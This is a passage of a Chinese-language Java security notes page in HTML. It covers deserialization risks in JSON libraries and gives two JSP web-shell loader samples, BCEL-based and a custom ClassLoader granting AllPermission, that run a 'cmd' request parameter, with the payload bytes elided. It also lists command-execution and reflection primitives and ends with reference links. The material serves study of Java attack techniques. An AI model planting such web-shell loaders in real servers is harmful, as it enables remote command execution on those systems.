&lt;h3 id=&#34;主流json库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主流json库&#34;&gt;#&lt;/a&gt; 主流 JSON 库&lt;/h3&gt;
&lt;p&gt;主流的 JSON 库有 Gson、Jackson、Fastjson 等，因为 JSON 常在反序列化中使用，所以相关库都有较大的影响。&lt;/p&gt;
&lt;p&gt;其中 Gson 默认只能反序列化基本类型，如果是复杂类型，需要程序员实现反序列化机制，相对比较安全。&lt;/p&gt;
&lt;p&gt;Jackson 除非指明 @jsonAutoDetect，Jackson 不会反序列化非 public 属性。在防御时，可以不使用 enableDefaultTyping 方法。相关 CVE 有 CVE-2017-7525、CVE-2017-15095。&lt;/p&gt;
&lt;p&gt;FastJson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也支持从 JSON 字符串反序列化到 Java Bean，相关 CVE 有 CVE-2017-18349 等。&lt;/p&gt;
&lt;p&gt;FastJson 常见的 Sink 点有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;JSON.toJSONString&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JSON.parseObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JSON.parse&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webshell&#34;&gt;#&lt;/a&gt; WebShell&lt;/h1&gt;
&lt;h2 id=&#34;bcel字节码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bcel字节码&#34;&gt;#&lt;/a&gt; BCEL 字节码&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; bcelCode &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;valueOf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassLoader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bcelCode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getConstructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cmd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;自定义类加载器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义类加载器&#34;&gt;#&lt;/a&gt; 自定义类加载器&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassLoader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token annotation punctuation&#34;&gt;@Override&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;shell&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;findClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token annotation punctuation&#34;&gt;@Override&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;findClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; bytes &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Base64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getDecoder&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;PermissionCollection&lt;/span&gt; pc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Permissions&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            pc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;AllPermission&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;ProtectionDomain&lt;/span&gt; protectionDomain &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ProtectionDomain&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;CodeSource&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Certificate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; pc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;defineClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; bytes&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; bytes&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; protectionDomain&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Exception&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;findClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;shell&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getConstructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cmd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;执行命令变式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行命令变式&#34;&gt;#&lt;/a&gt; 执行命令变式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.lang.ProcessBuilder#start&lt;/li&gt;
&lt;li&gt;java.lang.Runtime#exec&lt;/li&gt;
&lt;li&gt;TemplatesImpl&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;基于反射&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于反射&#34;&gt;#&lt;/a&gt; 基于反射&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;class.forName&lt;/li&gt;
&lt;li&gt;MethodAccessor.invoke&lt;/li&gt;
&lt;li&gt;Method.invoke&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他shell变式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他shell变式&#34;&gt;#&lt;/a&gt; 其他 Shell 变式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.beans.Expression&lt;/li&gt;
&lt;li&gt;java.lang.ClassLoader&lt;/li&gt;
&lt;li&gt;java.net.URLClassLoader&lt;/li&gt;
&lt;li&gt;jdk.nashorn.internal.runtime.ScriptLoader&lt;/li&gt;
&lt;li&gt;ObjectInputStream.resolveClass&lt;/li&gt;
&lt;li&gt;ScriptEngine.eval&lt;/li&gt;
&lt;li&gt;ScriptEngineManager&lt;/li&gt;
&lt;li&gt;ToolProvider.getSystemJavaCompiler&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tomcat-容器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tomcat-容器&#34;&gt;#&lt;/a&gt; Tomcat 容器&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Servlet&lt;/li&gt;
&lt;li&gt;Filter&lt;/li&gt;
&lt;li&gt;Listener&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;官方文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#官方文档&#34;&gt;#&lt;/a&gt; 官方文档&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NvbW1vbnMuYXBhY2hlLm9yZy9wcm9wZXIvY29tbW9ucy1vZ25sLw==&#34;&gt;ognl&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzkvc2VjdXJpdHkvdG9jLmh0bQ==&#34;&gt;Java SE Security Guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzcvZG9jcy90ZWNobm90ZXMvZ3VpZGVzL3JtaS9yZWxub3Rlcy5odG1s&#34;&gt;Java RMI Release Notes for JDK 6&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9qYXZhL2phdmFzZS83dTIxLXJlbG5vdGVzLTE5MzI4NzMuaHRtbA==&#34;&gt;Java Release Notes for JDK 7&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;机制说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#机制说明&#34;&gt;#&lt;/a&gt; 机制说明&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3p3YmlnL3AvMTExMjcyMjIuaHRtbA==&#34;&gt;深入理解 Java 类加载&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;反序列化-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-3&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;h3 id=&#34;标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#标准&#34;&gt;#&lt;/a&gt; 标准&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbGVudGJhbGFuY2V5aC9hcnRpY2xlL2RldGFpbHMvODE4Mzg0OQ==&#34;&gt;Java 序列化【草案一】&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vZW4vamF2YS9qYXZhc2UvMTQvZG9jcy9zcGVjcy9zZXJpYWxpemF0aW9uL2luZGV4Lmh0bWw=&#34;&gt;Java 14 Object Serialization Specification&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;利用与技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用与技巧&#34;&gt;#&lt;/a&gt; 利用与技巧&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvZnJvaG9mZjEvYXBwc2VjY2FsaS0yMDE1LW1hcnNoYWxsaW5nLXBpY2tsZXM=&#34;&gt;Marshalling Pickles how deserializing objects can ruin your day&lt;/span&gt;&lt;/li&gt;
